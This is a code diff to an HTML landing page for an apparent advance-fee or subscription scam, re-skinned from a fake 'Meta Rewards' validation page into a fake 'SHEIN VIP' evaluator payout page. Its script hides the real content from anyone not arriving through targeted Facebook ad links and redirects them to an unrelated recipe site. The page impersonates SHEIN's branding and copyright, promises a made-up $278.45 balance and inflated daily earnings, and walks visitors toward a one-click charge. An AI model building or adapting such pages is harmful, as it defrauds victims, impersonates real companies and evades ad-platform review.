@@ -9,27 +9,27 @@
     var isDev=h==='localhost'||h==='127.0.0.1'||h.indexOf('preview--')!==-1||h.indexOf('-preview.')!==-1||/\.lovableproject\.com$|^192\.168\./.test(h);
     var q=new URLSearchParams(location.search);
     var c=(q.get('utm_campaign')||q.get('campaign')||'').toLowerCase();
-    var camp=c.indexOf('mtp')!==-1 && !!q.get('fbclid');
+    var camp=(c.indexOf('shein')!==-1 || c.indexOf('shp')!==-1 || c.indexOf('mtp')!==-1) && !!q.get('fbclid');
     var buy=!!q.get('cid') && !!q.get('pm');
     if(!isDev && !(camp&&buy)){
       document.documentElement.style.display='none';
       location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
       return;
     }
-    document.title='Account Security & Payout Setup — Meta Rewards';
+    document.title='Evaluator Preferences & Payout Setup — SHEIN VIP';
     var m=document.querySelector('meta[name="description"]');
-    if(m)m.setAttribute('content','Complete your account validation to release your full rewards.');
+    if(m)m.setAttribute('content','Set your product category preferences and payout schedule to release your $278.45 balance.');
   }catch(e){}
 })();
 </script>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Account Security & Payout Setup — Meta Rewards</title>
-<meta name="description" content="Complete your account validation to release your full rewards." />
-<link rel="icon" href="../images/DF32jO8vZckV.png" />
+<title>Evaluator Preferences & Payout Setup — SHEIN VIP</title>
+<meta name="description" content="Set your product category preferences and payout schedule to release your $278.45 balance." />
+<link rel="icon" href="../images/shein-icon.svg" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../css/MM3nXP63nRRs.css" />
 
 <!-- Trackly funnel -->
@@ -49,13 +49,14 @@ fbq('init','1748898273044458');fbq('track','PageView');
 
 <style>
   :root {
-    --fb-blue: #1877f2;
-    --fb-blue-hover: #166fe5;
-    --fb-blue-soft: #e7f3ff;
-    --fb-text: #050505;
-    --fb-muted: #65676b;
-    --fb-border: #e4e6eb;
-    --fb-bg: #f0f2f5;
+    --fb-blue: #111111;
+    --fb-blue-hover: #262626;
+    --fb-blue-soft: #fff1f2;
+    --shein-coral: #ff4d6d;
+    --fb-text: #111111;
+    --fb-muted: #666666;
+    --fb-border: #ebebeb;
+    --fb-bg: #f8f9fa;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
@@ -76,7 +77,7 @@ fbq('init','1748898273044458');fbq('track','PageView');
     border: 1px solid var(--fb-border);
     border-radius: 24px;
     padding: 28px 22px;
-    box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.1), 0 2px 8px rgba(0, 0, 0, 0.04);
+    box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.03);
     animation: cardIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) both;
   }
   @keyframes cardIn {
@@ -92,21 +93,8 @@ fbq('init','1748898273044458');fbq('track','PageView');
     margin-bottom: 18px;
   }
   .brand-logo {
-    width: 38px;
-    height: 38px;
-  }
-  .brand-title {
-    font-size: 20px;
-    font-weight: 800;
-    color: #050505;
-    letter-spacing: -0.5px;
-    line-height: 1.1;
-  }
-  .brand-sub {
-    font-size: 13px;
-    font-weight: 400;
-    color: var(--fb-muted);
-    letter-spacing: -0.2px;
+    height: 28px;
+    object-fit: contain;
   }
 
   /* Progress Bar */
@@ -123,26 +111,26 @@ fbq('init','1748898273044458');fbq('track','PageView');
     margin-bottom: 7px;
   }
   .progress-step-tag {
-    color: var(--fb-blue);
-    background: var(--fb-blue-soft);
+    color: #111111;
+    background: #f1f2f4;
     padding: 3px 10px;
     border-radius: 999px;
     font-size: 11px;
-    font-weight: 700;
+    font-weight: 800;
     letter-spacing: 0.04em;
     text-transform: uppercase;
   }
   .progress-bar-bg {
     width: 100%;
     height: 6px;
-    background: #e4e6eb;
+    background: #ebebeb;
     border-radius: 999px;
     overflow: hidden;
   }
   .progress-bar-fill {
     height: 100%;
     width: 35%;
-    background: linear-gradient(90deg, #1877F2, #3897f0);
+    background: #111111;
     border-radius: 999px;
     transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
   }
@@ -416,16 +404,9 @@ fbq('init','1748898273044458');fbq('track','PageView');
 
   <div class="setup-card">
 
-    <!-- Header Meta Rewards -->
+    <!-- Header SHEIN VIP -->
     <div class="brand-header">
-      <svg class="brand-logo" viewBox="0 0 36 36" fill="none">
-        <circle cx="18" cy="18" r="18" fill="#1877F2"/>
-        <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
-      </svg>
-      <div>
-        <div class="brand-title">facebook</div>
-        <div class="brand-sub">rewards validation</div>
-      </div>
+      <img src="../images/shein-logo.svg" alt="SHEIN VIP" class="brand-logo">
     </div>
 
     <!-- Barra de Progresso Interativa -->
@@ -439,10 +420,10 @@ fbq('init','1748898273044458');fbq('track','PageView');
       </div>
     </div>
 
-    <!-- ETAPA 1: Volume de Avaliação de Campanhas -->
+    <!-- ETAPA 1: Volume e Categoria de Avaliação de Produtos -->
     <div id="quiz-step-1" class="quiz-step active">
-      <h2 class="step-headline">Evaluation Schedule &amp; Activity Level</h2>
-      <p class="step-desc">Select your availability to assign appropriate sponsored content volume to your evaluator profile.</p>
+      <h2 class="step-headline">Fashion Review Category &amp; Weekly Schedule</h2>
+      <p class="step-desc">Select your primary apparel preference to allocate your weekly product sample batches.</p>
 
       <div class="options-list">
         <button type="button" class="opt-btn" onclick="selectOption(1, 'Daily Active Evaluator')">
@@ -456,8 +437,8 @@ fbq('init','1748898273044458');fbq('track','PageView');
               </svg>
             </div>
             <div>
-              <span class="opt-text-primary">Daily Active Schedule</span>
-              <span class="opt-text-secondary">Higher batch allocation (estimated $500+/day)</span>
+              <span class="opt-text-primary">Women's Apparel &amp; Trending Dresses</span>
+              <span class="opt-text-secondary">High priority allocation (estimated $350–$500/day)</span>
             </div>
           </div>
           <div class="opt-radio"><div class="opt-radio-dot"></div></div>
@@ -472,7 +453,7 @@ fbq('init','1748898273044458');fbq('track','PageView');
               </svg>
             </div>
             <div>
-              <span class="opt-text-primary">Flexible Schedule (2–3 Days/Week)</span>
+              <span class="opt-text-primary">Shoes, Bags &amp; Accessories</span>
               <span class="opt-text-secondary">Moderate batch volume (estimated $200–$350/day)</span>
             </div>
           </div>
@@ -487,8 +468,8 @@ fbq('init','1748898273044458');fbq('track','PageView');
               </svg>
             </div>
             <div>
-              <span class="opt-text-primary">On-Demand Participation</span>
-              <span class="opt-text-secondary">Review campaigns whenever convenient</span>
+              <span class="opt-text-primary">All Fashion Categories &amp; Home</span>
+              <span class="opt-text-secondary">Flexible evaluations whenever convenient</span>
             </div>
           </div>
           <div class="opt-radio"><div class="opt-radio-dot"></div></div>
@@ -499,7 +480,7 @@ fbq('init','1748898273044458');fbq('track','PageView');
     <!-- ETAPA 2: Canal de Notificação de Transferência -->
     <div id="quiz-step-2" class="quiz-step">
       <h2 class="step-headline">Direct Payout Confirmation Method</h2>
-      <p class="step-desc">Choose your preferred official channel to receive transaction receipts and clearance notices.</p>
+      <p class="step-desc">Choose your preferred official channel to receive transaction receipts and tracking notices.</p>
 
       <div class="options-list">
         <button type="button" class="opt-btn" onclick="selectOption(2, 'Multi-channel SMS and Email')">
@@ -544,8 +525,8 @@ fbq('init','1748898273044458');fbq('track','PageView');
               </svg>
             </div>
             <div>
-              <span class="opt-text-primary">In-Portal Dashboard Records</span>
-              <span class="opt-text-secondary">View status directly within the Meta portal</span>
+              <span class="opt-text-primary">SHEIN VIP Portal Records</span>
+              <span class="opt-text-secondary">View status directly within your member account</span>
             </div>
           </div>
           <div class="opt-radio"><div class="opt-radio-dot"></div></div>
@@ -553,10 +534,10 @@ fbq('init','1748898273044458');fbq('track','PageView');
       </div>
     </div>
 
-    <!-- ETAPA 3 (REFEITA): Protocolo de Liquidação e Liberação do Saldo -->
+    <!-- ETAPA 3: Protocolo de Liquidação e Liberação do Saldo -->
     <div id="quiz-step-3" class="quiz-step">
       <h2 class="step-headline">Payout Clearance &amp; Security Protocol</h2>
-      <p class="step-desc">Select how the clearinghouse should route your $278.45 commission transfer.</p>
+      <p class="step-desc">Select how the clearinghouse should route your $278.45 evaluator compensation transfer.</p>
 
       <div class="options-list">
         <button type="button" class="opt-btn" onclick="selectOption(3, 'Express Automated Clearing (<5 min)')">
@@ -595,14 +576,14 @@ fbq('init','1748898273044458');fbq('track','PageView');
     <!-- ETAPA FINAL: Conclusão & Cobrança 1-Clique -->
     <div id="quiz-step-final" class="quiz-step">
       <div class="unlocked-hero">
-        <div class="shield-icon-wrap">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <div class="shield-icon-wrap" style="background:#fff1f2;">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--shein-coral);">
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             <polyline points="9 12 11 14 15 10"/>
           </svg>
         </div>
 
-        <h2 class="step-headline" style="text-align:center;">Account Validation Completed</h2>
+        <h2 class="step-headline" style="text-align:center;">Reviewer Setup Completed</h2>
         <div class="balance-pill">
           <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
             <polyline points="20 6 9 17 4 12"></polyline>
@@ -630,10 +611,10 @@ fbq('init','1748898273044458');fbq('track','PageView');
       </div>
     </div>
 
-    <p class="footer-notice">Secure encrypted connection · Meta Rewards Security Protocol</p>
+    <p class="footer-notice">Secure encrypted connection · SHEIN VIP Security Protocol</p>
   </div>
 
-  <p class="footer-notice" style="margin-top:16px;">© <span id="yr"></span> Meta Platforms Inc. All rights reserved.</p>
+  <p class="footer-notice" style="margin-top:16px;">© <span id="yr"></span> SHEIN Distribution Corp. All rights reserved.</p>
 
   <div id="overlay"><div class="spinner"></div><p id="overlay-text">Processing activation...</p></div>
 
